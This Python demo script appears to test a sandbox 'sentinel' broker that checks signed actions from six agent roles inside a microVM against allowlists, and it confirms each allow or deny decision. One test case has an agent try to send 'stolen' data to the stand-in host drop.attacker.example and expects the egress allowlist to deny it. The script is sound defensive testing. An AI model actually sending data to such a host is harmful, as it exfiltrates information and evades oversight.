"""
Six-role in-cell agent demo. Runs inside the microVM, which has no route out
except the sentinel. Submits abstract actions and checks the sentinel's
decisions; no proposed file or tool effects are executed. Stdlib only.
"""

from __future__ import annotations

import json
import hashlib
import hmac
import os
import secrets
import time
import urllib.request

from swarm.catalog import AGENT_ROLES

BROKER = os.environ.get("BROKER_URL", "http://172.16.0.1:8085/submit")

# Each role uses an identity already granted capabilities by the host broker.
# The host broker explicitly permits this shared internal-host workflow.
# Its budgets and security state persist across client invocations.
ROLE_ATTEMPTS = {
    "researcher": [
        ("file_read", {"path": "/work/input/task.json"}, True, "fs-read-scope"),
        ("net_send", {"host": "api.internal.svc", "payload": "result ok"},
         True, "egress-allowlist"),
        ("net_send", {"host": "drop.attacker.example", "payload": "stolen"},
         False, "egress-allowlist"),
    ],
    "writer": [
        ("file_write", {"path": "/work/tmp/report", "payload": "report ok"},
         True, "fs-write-scope"),
    ],
    # The host adapter deliberately runs no agent-supplied program, so the
    # HTTP capability withholds tool_exec entirely.
    "analyst": [
        ("tool_exec", {"tool": "python"}, False, "capability-type"),
    ],
    "reporter": [
        ("net_send", {"host": "api.internal.svc", "payload": "summary ok"},
         True, "egress-allowlist"),
    ],
    "resolver": [
        ("dns_resolve", {"host": "api.internal.svc"}, True, "dns-allowlist"),
    ],
    "coordinator": [
        ("bus_publish", {"payload": "task complete"}, True, "bus-open"),
    ],
}


def agent_key(agent_id: str) -> bytes:
    """This agent's signing key, from the guest key map or a single key file.

    Six roles sign their own requests, so the guest is provisioned with a JSON
    map (AGENT_KEYS_FILE). AGENT_KEY_FILE stays supported for a single-agent
    guest holding only its own key.
    """
    path = os.environ.get("AGENT_KEYS_FILE")
    if path:
        with open(path, encoding="ascii") as handle:
            keys = json.load(handle)
        if agent_id not in keys:
            raise RuntimeError(f"no signing key provisioned for {agent_id}")
        return bytes.fromhex(keys[agent_id])
    with open(os.environ["AGENT_KEY_FILE"], encoding="ascii") as handle:
        return bytes.fromhex(handle.read().strip())


def submit(agent_id: str, type_: str, **params) -> dict:
    body = json.dumps({"agent_id": agent_id, "type": type_, "params": params}).encode()
    key = agent_key(agent_id)
    nonce = secrets.token_hex(16)
    message = agent_id.encode() + b"\n" + nonce.encode() + b"\n" + body
    signature = hmac.new(key, message, hashlib.sha256).hexdigest()
    req = urllib.request.Request(BROKER, data=body,
                                 headers={"Content-Type": "application/json",
                                          "X-Agent-ID": agent_id,
                                          "X-Nonce": nonce,
                                          "X-Signature": signature})
    with urllib.request.urlopen(req, timeout=5) as resp:
        return json.loads(resp.read())


def run_agent(agent_id: str, role: str, location: str) -> None:
    prefix = f"[{agent_id} | {location}]"
    print(f"{prefix} starting pid={os.getpid()} uid={os.getuid()} "
          f"role={role} sentinel={BROKER}", flush=True)
    attempts = ROLE_ATTEMPTS[role]
    for type_, params, expected_allow, expected_rule in attempts:
        print(f"{prefix} submitting action={type_} to host sentinel", flush=True)
        d = submit(agent_id, type_, **params)
        verb = "ALLOW" if d["allow"] else "DENY "
        print(f"{prefix} sentinel decision=[{verb}] {type_:<10} {params} :: {d['rule']}", flush=True)
        if d["allow"] is not expected_allow or d["rule"] != expected_rule:
            raise RuntimeError(
                f"unexpected sentinel decision: {d!r}; "
                f"expected allow={expected_allow}, rule={expected_rule}"
            )
        if type_ == "file_read" and "task" not in d.get("result", {}).get("content", ""):
            raise RuntimeError("approved file read did not return host adapter content")
        if type_ == "net_send" and expected_allow and not d.get("result", {}).get("recorded"):
            raise RuntimeError("approved send did not reach host outbox")
    print(f"{prefix} completed; all {len(attempts)} sentinel decisions matched expectations",
          flush=True)


def main() -> None:
    location = os.environ.get("AGENT_RUNTIME", "local process")
    time.sleep(1.0)  # let the sentinel come up
    for agent_id, role in AGENT_ROLES.items():
        run_agent(agent_id, role, location)
    print(f"Completed {len(AGENT_ROLES)} agent roles; all sentinel decisions matched expectations",
          flush=True)


if __name__ == "__main__":
    main()
